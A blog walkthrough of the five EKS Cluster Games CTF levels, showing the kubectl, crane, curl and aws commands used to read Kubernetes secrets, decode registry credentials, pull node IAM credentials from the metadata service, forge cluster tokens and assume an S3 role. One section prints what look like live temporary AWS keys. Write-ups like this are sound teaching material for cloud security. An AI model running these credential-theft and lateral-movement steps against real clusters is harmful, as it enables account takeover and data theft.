---
title: "EKS Cluster Games All Solution"
date: 2025-09-16
draft: false
author: "Lychnobyte"
tags:
  - cloud
  - aws
  - eks
  - kubernetes
image: "https://cdn.hashnode.com/res/hashnode/image/upload/v1753746016252/bc4ccf53-71e9-4372-aea1-d27d27cd610d.jpeg"
description: "Detailed solutions for the EKS Cluster Games, covering Kubernetes secrets, registry hunting, and ECR image analysis."
toc: true
---

> **_Cover Illustration source_** [https://www.pixiv.net/en/artworks/128345987](https://www.pixiv.net/en/artworks/128345987)

Helloo every-nyan ≽^•⩊•^≼

Yet another post talk about cloud security challenges! This time specifically about kubernetes cluster that deployed using AWS EKS!

The challenge still up and running at [https://eksclustergames.com/](https://eksclustergames.com/)

This platform also using `wargames` style with 5 level challenges!

So, without further ado let’s start to solve those challenges!

## 1. Secret Seeker

First challenge description

> Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

and kubernetes permission

```json
{
    "secrets": [
        "get",
        "list"
    ]
}
```

Well, pretty straightforward we just need to `list` and `get` secrets inside the kubernetes cluster.

Just run these command in web shell

```bash
kubectl get secrets
kubectl get secrets log-rotate -oyaml
```

![Secrets List](https://cdn.hashnode.com/res/hashnode/image/upload/v1753747753239/49b0c33f-5638-428a-bfbf-25f36207dd6f.png)

There is one secrets `log-rotate` and when we read it contain `flag` variable with `base64` encoded string.

To decode the `flag` you can just run this one-line command

```bash
kubectl get secrets log-rotate -ojsonpath='{.data.flag}' | base64 -d
```

![Flag decoded](https://cdn.hashnode.com/res/hashnode/image/upload/v1753747892866/cf993e2f-141b-4696-9041-6b2c7c465070.png)

## 2. Registry Hunt

Second challenges

> A thing we learned during our research: always check the container registries.
>
> For your convenience, the [**crane**](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.

with kubernetes permission

```json
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```

Now we can only `get` secrets but we can `list` and `get` pods. So, i assume we need to know the exact secrets name from pod spec. Because secrets can attached to a pod.

Run command below to find that secrets name

```bash
kubectl get pod
kubectl get pod database-pod-2c9b3a4e -oyaml
```

![Pod Details](https://cdn.hashnode.com/res/hashnode/image/upload/v1753748538839/34780805-711c-46c8-9eed-63a2661f1527.png)

As we can see there is secrets that used as authentication for pulling image in `imagePullSecrets` section named `registry-pull-secrets-780bab1d`

Lets’s check that secrets

```bash
kubectl get secret registry-pull-secrets-780bab1d -oyaml
```

![Registry Secrets](https://cdn.hashnode.com/res/hashnode/image/upload/v1753748782943/f21afdfe-bd02-4d5e-a4bc-a287143db95b.png)

Yap, it is a secrets that stored credential for authentication to image registry.

To retrieve credential in plaintext use command below

```bash
kubectl get secret registry-pull-secrets-780bab1d -ojsonpath='{.data.\.dockerconfigjson}' | base64 -d && echo
kubectl get secret registry-pull-secrets-780bab1d -ojsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq '.auths["index.docker.io/v1/"].auth' | tr -d '"' | base64 -d && echo
```

![Docker Config Decoded](https://cdn.hashnode.com/res/hashnode/image/upload/v1753749003133/54c835f0-3e21-4e0b-a731-78410d3facd0.png)

The credential pattern is `<user>:<password>`

Login with that credential using `crane` then `pull` the image that used in running pod

```bash
crane auth login docker.io -u eksclustergames -p dckr_pat_REDACTED
crane pull eksclustergames/base_ext_image ./chall2.tar
```

![Crane Pull](https://cdn.hashnode.com/res/hashnode/image/upload/v1753749292203/39835701-2936-405e-b287-f09ce18cdb71.png)

Then extract the image `.tar` file to obtain `flag.txt`

![Flag extraction](https://cdn.hashnode.com/res/hashnode/image/upload/v1753749381393/9102ecb2-5ad2-40e5-9110-94a0521417f2.png)

## 3. Image Inquisition

Third challenge

> A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
>
> Remember: You are running inside a compromised EKS pod.

and kubernetes permission

```json
{
    "pods": [
        "list",
        "get"
    ]
}
```

Alright, i think we need to work with container image again. Let’s retrieve the image that running pod using.

![Image Info](https://cdn.hashnode.com/res/hashnode/image/upload/v1753782916698/7a22c9d2-3e05-46c9-ad25-1aedf2e800ef.png)

Well, pretty long image name and there is no `imagePullSecrets` value been set like previous challenge.

So, how to authenticate to `ecr registry`? Well, as mentioned description we are inside compromised EKS pod. We can get some credentials using `IMDS` just like how usually we did in`EC2`

Get AWS credentials using command below

```bash
curl http://169.254.169.254/latest/meta-data/placement/region
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
```

![AWS Credentials](https://cdn.hashnode.com/res/hashnode/image/upload/v1753783376116/75335c80-b070-4e19-a890-79f6f2057163.png)

Set the credentials using export

```bash
export AWS_DEFAULT_REGION=<region>
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
```

Then login to `ECR` registry using password that can be retrieve using `aws cli` .

Well, you can easily do that with this one-line

```bash
aws ecr get-login-password | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
```

![ECR Login](https://cdn.hashnode.com/res/hashnode/image/upload/v1753783708620/eb20643c-946c-4d68-aeb5-a170aa86ac5a.png)

Then get the image digest layer to get flag using command below

```bash
crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq .
```

![Crane Config](https://cdn.hashnode.com/res/hashnode/image/upload/v1753784025594/631c4d43-e89e-4461-8681-cec7a1d9eaef.png)

## 4. Pod Break

Forth challenge

> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
>
> Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

without any kubernetes permission :(

But we can still retrieve AWS credentials using `IMDS` then set using export just like in previous challenge

```bash
# Get credential using IMDS
curl http://169.254.169.254/latest/meta-data/placement/region
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole

# Set credential using export
export AWS_DEFAULT_REGION=us-west-1
export AWS_ACCESS_KEY_ID=ASIA2AVYNEVMS7TN4SNY
export AWS_SECRET_ACCESS_KEY=4Kcs7G5L/JmbJdCr/e1+ee3qV0REcXWtUJBiLEVr
export AWS_SESSION_TOKEN=FwoGZXIvYXdzEI7//////////wEaDOoKIiUxvoQ0UIHjqyK3AXpAMgQHXeU5+PYF2kWqz88dQeCt0kZyzSh/USYSS8mDlWf04eQvumTbwR5gsyYZ6dZ0qQEyGqBoSMdto7udPz7h6raQ3nQ0Mnkn1O3CkyzD1xrLSNqV6MHQ9ljLSwW5jDYlHAKlWvnG5tAu1wLxTDMpeFMD5fXePA3nu97hxQ4Bap/ljIag7JmGjpsXXwjWlRjotVc8zfZC+VIcnPDFdv2qDyuxS+5Ozw2wvN+MaO6f8MVrkq5TASiQh6PEBjIt9xsnEa8adysXLHJUJxePXNjaisKb9+za5CeTXndhlanXjim+X19LJA6KDbLl
```

![AWS Node Credentials](https://cdn.hashnode.com/res/hashnode/image/upload/v1753793483844/ce1405e2-4151-42fd-bd7b-79d064965c38.png)

We can using our aws credential to generate token for accessing kubernetes cluster. But, before that we need to know `cluster-name` to do that.

Well, `cluster-name` usually stored in kubectl config in `~/.kube/config` file.

![Kube Config](https://cdn.hashnode.com/res/hashnode/image/upload/v1753793744008/092b7078-2bb9-4729-b3c2-2780a758bd2b.png)

Cluster name is `localcfg` , ok now we can generate our token using command below

```bash
aws eks get-token --cluster-name localcfg
```

![EKS Token](https://cdn.hashnode.com/res/hashnode/image/upload/v1753793988990/e54154de-7fe4-488d-bb0b-b0f387c07491.png)

Then using that token as our authentication for `kubectl` to access the kubernetes cluster

```bash
kubectl --token $TOKEN auth can-i --list
```

![Kubectl Auth Check](https://cdn.hashnode.com/res/hashnode/image/upload/v1753794024447/d07a0fc5-8a7f-45b5-9894-0e4ee4d51cd8.png)

Well, well, well. The token doesn’t seems work :/

Ok, maybe the `cluster name` we use is wrong.

Let’s check our current aws credential, maybe there is a hint

```bash
aws sts get-caller-identity
```

![Caller Identity](https://cdn.hashnode.com/res/hashnode/image/upload/v1753794776817/ac262a68-d4fd-41cb-8a94-efa62ac3ca06.png)

Based on the IAM role name above we can guess the `cluster name` probably `eks-challenge-cluster`.

```bash
aws eks get-token --cluster-name eks-challenge-cluster
kubectl --token $TOKEN auth can-i --list
```

Alright, now token is working. Yeay

![Kubectl Access Success](https://cdn.hashnode.com/res/hashnode/image/upload/v1753795079504/05c629ea-1d6d-403f-8d92-66d3b62737ec.png)

Well, we got permission `list` and `get` on resource `pods`, `secrets` and `serviceaccount`.

Let’s check `secrets` because usually flag are stored there.

```bash
kubectl --token $TOKEN get secret
kubectl --token $TOKEN get secret node-flag -oyaml
kubectl --token $TOKEN get secret node-flag -ojsonpath='{.data.flag}' | base64 -d
```

![Flag obtained](https://cdn.hashnode.com/res/hashnode/image/upload/v1753795527131/8ac78acb-0e80-4b2b-b5fb-b092c546e7fb.png)

Yap, the flag is there

## 5. Container Secrets Infrastructure

The last challenge

> You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the *s3access-sa* service account, and get the flag?

And we got the IAM Policy

```json
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```

Trust policy

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```

Kubernetes permission

```json
{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```

Well, this last challenges give us a bunch of permissions!

Let’s start from listing kubernetes resources.

![Resource List](https://cdn.hashnode.com/res/hashnode/image/upload/v1753896380128/8fe923a1-65b5-4190-a5d2-c6836741eff0.png)

There is no pod and secret, only serviceaccount then what’s the point of giving us those permissions? lol

Anyway, let’s see what kind of serviceaccount we have

![Service Accounts](https://cdn.hashnode.com/res/hashnode/image/upload/v1753896900774/a7017cd0-c20d-4ee4-b036-1273727719a3.png)

There is 3 serviceaccount

1. `default` → default serviceaccount in namespace, nothing to do with this

2. `debug-sa` → dummy serviceaccount, attached with some aws role

3. `s3access-sa` → seems serviceaccount that mentioned in challenges description. It has `challengeEksS3Role` too.

Let’s try generate token from `s3access-sa` serviceaccount

![Token forbidden](https://cdn.hashnode.com/res/hashnode/image/upload/v1758036868249/c1a44623-4ebb-4dab-973a-8ca0a90f2229.png)

Oops, it’s forbidden. Seems like we don’t have permissions to do that. Instead, we can generate token from `debug-sa` serviceaccount only.

![Debug Token](https://cdn.hashnode.com/res/hashnode/image/upload/v1758036968705/788ac9fb-8cbe-4692-9f68-0d03f3633e4b.png)

Well, actually we can use that `debug-sa` since we has `trust policy` to assume role we just use same method like in previous big iam challenge.

So, just need to generate token from `debug-sa` but since there is `condition` check to assume role we need to add option `--audience “sts.amazonaws.com”` when generate the token.

```json
kubectl create token debug-sa --audience "sts.amazonaws.com"
aws sts assume-role-with-web-identity --role-session-name challenge5 --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --web-identity-token $TOKEN
```

![Assume Role](https://cdn.hashnode.com/res/hashnode/image/upload/v1758038779273/35aed346-004c-4b4b-82f8-e6bae4df5af0.png)

We set AWS credentials we’ve got, then access the `flag`

```json
export AWS_DEFAULT_REGION=<region>
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>

aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag -
```

![S3 Flag](https://cdn.hashnode.com/res/hashnode/image/upload/v1758039237117/cac2c3a6-b207-42e3-abd9-e9a71d68235b.png)

That’s it! We solve all challenges!

And as usual after solve all challenges we can got certificate like this

![Certificate](https://eksclustergames.com/image/ZrXKqFFO)

Reference:

* [https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#pivoting-to-the-cloud-environment-by-stealing-pod-identities](https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#pivoting-to-the-cloud-environment-by-stealing-pod-identities)

* [https://www.wiz.io/blog/lateral-movement-risks-in-the-cloud-and-how-to-prevent-them-part-2-from-k8s-clust](https://www.wiz.io/blog/lateral-movement-risks-in-the-cloud-and-how-to-prevent-them-part-2-from-k8s-clust)
